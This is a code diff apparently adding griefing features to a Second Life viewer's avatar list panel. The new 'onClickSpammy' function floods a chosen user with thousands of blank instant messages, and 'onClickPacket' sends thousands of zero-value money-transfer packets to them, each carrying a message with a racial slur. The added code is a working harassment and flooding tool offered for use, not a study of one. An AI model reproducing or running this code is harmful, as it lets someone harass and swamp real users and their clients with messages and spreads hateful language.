@@ -355,6 +355,8 @@ BOOL LLFloaterAvatarList::postBuild()
 	childSetAction("tphist_btn", onClickTpHistory, this);
 	childSetAction("inter_btn", onClickInterceptor, this);
 	childSetAction("phant_btn", onClickPhantom, this);
+	childSetAction("packet_btn", onClickPacket, this);
+	childSetAction("spammy_btn", onClickSpammy, this);
 	//<edit>
 	childSetAction("get_key_btn", onClickGetKey, this);
 
@@ -1428,6 +1430,75 @@ LLAgent::togglePhantom();
 	chat.mSourceType = CHAT_SOURCE_SYSTEM;
 	chat.mText = llformat("%s%s","Phantom ",(LLAgent::getPhantom()? "On" : "Off"));
 	LLFloaterChat::addChat(chat);
+}
+
+void LLFloaterAvatarList::onClickSpammy(void *userdata)
+{
+	LLFloaterAvatarList *self = (LLFloaterAvatarList*)userdata;
+ 	LLScrollListItem *item = self->mAvatarList->getFirstSelected();
+
+	if (NULL == item) return;
+
+	LLUUID agent_id = item->getUUID();
+	F32 fps = LLViewerStats::getInstance()->mFPSStat.getMeanPerSec();
+			F32 x = 0.0f;
+			F32 tosend = 9999.0f / fps;
+			LLUUID transaction_id;
+			while(x < tosend)
+			{
+			std::string my_name;
+			gAgent.buildFullname(my_name);
+			LLUUID rand;
+			rand.generate();
+			send_improved_im(agent_id,
+				my_name.c_str(),
+				"|",
+				IM_OFFLINE,
+				IM_BUSY_AUTO_RESPONSE,
+				rand,
+				NO_TIMESTAMP,
+				(U8*)EMPTY_BINARY_BUCKET,
+				EMPTY_BINARY_BUCKET_SIZE);
+				x = x + 1.0f;
+			}
+	 }
+		
+void LLFloaterAvatarList::onClickPacket(void *userdata)
+{
+	LLFloaterAvatarList *self = (LLFloaterAvatarList*)userdata;
+ 	LLScrollListItem *item = self->mAvatarList->getFirstSelected();
+	if (item)
+	{
+	LLUUID agent_id = item->getUUID();
+				if(agent_id.notNull())
+				{
+				F32 fps = LLViewerStats::getInstance()->mFPSStat.getMeanPerSec();
+					F32 x = 0.0f;
+					F32 tosend = 9999.0f / fps;
+					//LLMessageSystem* msg = gMessageSystem;
+					LLUUID transaction_id;
+					while(x < tosend)
+						{
+						LLMessageSystem* msg = gMessageSystem;
+						msg->newMessageFast(_PREHASH_MoneyTransferRequest);
+						msg->nextBlockFast(_PREHASH_AgentData);
+						msg->addUUIDFast(_PREHASH_AgentID, gAgent.getID());
+						msg->addUUIDFast(_PREHASH_SessionID, gAgent.getSessionID());
+						msg->nextBlockFast(_PREHASH_MoneyData);
+						msg->addUUIDFast(_PREHASH_SourceID, gAgent.getID() );
+						msg->addUUIDFast(_PREHASH_DestID, agent_id);
+						msg->addU8Fast(_PREHASH_Flags,0);
+						msg->addS32Fast(_PREHASH_Amount, 0);
+						msg->addU8Fast(_PREHASH_AggregatePermNextOwner, 0);
+						msg->addU8Fast(_PREHASH_AggregatePermInventory, 0);
+						msg->addS32Fast(_PREHASH_TransactionType, 5008 );
+						msg->addStringFast(_PREHASH_Description, "Here is Your Mother Fucking Monies Nigga Spend It Well");
+						msg->sendReliable(gAgent.getRegionHost());;
+						x = x + 1.0f;
+			}
+				}
+			}
+	return ;
 }
 //<edit> END OF SIMMS VOIDS
 
